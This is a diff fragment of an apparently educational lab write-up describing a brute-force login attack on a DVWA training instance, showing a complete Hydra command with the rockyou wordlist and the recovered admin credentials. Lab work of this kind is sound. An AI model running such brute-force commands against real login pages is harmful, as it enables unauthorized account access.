@@ -117,13 +117,10 @@ Performed a brute-force attack on the DVWA login page hosted at http://192.168.2
 ### ➡️ Hydra Command Executed:
 hydra -l admin -P rockyou.txt 192.168.2.129 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
 ### 📸 Attack Screenshot:
+![succl](https://github.com/user-attachments/assets/599a3340-0107-475e-b914-b5bfd66e071b)
 ➡️ Findings:
 Hydra identified 16 possible valid passwords for the admin user account during the brute-force attempt.
-
 ✅ Successfully Logged In
-
 Username: admin
-
 Password: password
-
 Used this combination to successfully gain access to the DVWA web application.
